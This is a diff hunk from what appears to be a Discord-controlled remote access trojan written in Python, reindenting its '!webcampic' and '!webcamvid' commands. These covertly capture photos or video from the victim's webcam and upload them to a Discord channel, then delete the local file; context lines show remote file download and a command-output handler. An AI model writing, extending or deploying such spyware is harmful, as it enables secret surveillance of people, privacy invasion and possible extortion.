@@ -149,40 +149,40 @@ async def on_message(message):
 			urllib.request.urlretrieve(nck, me)
 			await message.channel.send("[*] Command successfuly executed")
 
-    if message.content == '!webcampic':
-        import cv2
-        cam = cv2.VideoCapture(0)
-        retval, frame = cam.read()
-        cam.release()
-        cv2.imwrite('filename.jpg', frame)
-        cam.release()
-        file = discord.File("filename.jpg", filename="filename.jpg")
-        await  message.channel.send("[*] Command successfuly executed", file=file)
+    		if message.content == '!webcampic':
+        		import cv2
+        		cam = cv2.VideoCapture(0)
+        		retval, frame = cam.read()
+        		cam.release()
+        		cv2.imwrite('filename.jpg', frame)
+        		cam.release()
+        		file = discord.File("filename.jpg", filename="filename.jpg")
+        		await  message.channel.send("[*] Command successfuly executed", file=file)
 
 
-    if message.content.startswith('!webcamvid'):
-        import numpy as np
-        import os
-        import subprocess
-        import cv2
-        import time
-        capture_duration = int(message.content[11:])
-        cap = cv2.VideoCapture(0)
-        fourcc = cv2.VideoWriter_fourcc(*'XVID')
-        out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
-        start_time = time.time()
-        while( int(time.time() - start_time) < capture_duration ):
-            ret, frame = cap.read()
-            if ret==True:
-                out.write(frame)
-            else:
-                break
-        cap.release()
-        out.release()
-        cv2.destroyAllWindows()
-        file = discord.File("output.avi", filename="output.avi")
-        await  message.channel.send("[*] Command successfuly executed", file=file)
-        os.popen("del output.avi")
+    		if message.content.startswith('!webcamvid'):
+        		import numpy as np
+        		import os
+        		import subprocess
+        		import cv2
+        		import time
+        		capture_duration = int(message.content[11:])
+        		cap = cv2.VideoCapture(0)
+        		fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        		out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
+        		start_time = time.time()
+        		while( int(time.time() - start_time) < capture_duration ):
+            			ret, frame = cap.read()
+            			if ret==True:
+                			out.write(frame)
+            			else:
+        			        break
+        		cap.release()
+        		out.release()
+        		cv2.destroyAllWindows()
+		        file = discord.File("output.avi", filename="output.avi")
+        		await  message.channel.send("[*] Command successfuly executed", file=file)
+		        os.popen("del output.avi")
 
 		if message.content.startswith("!output"):
 			import subprocess
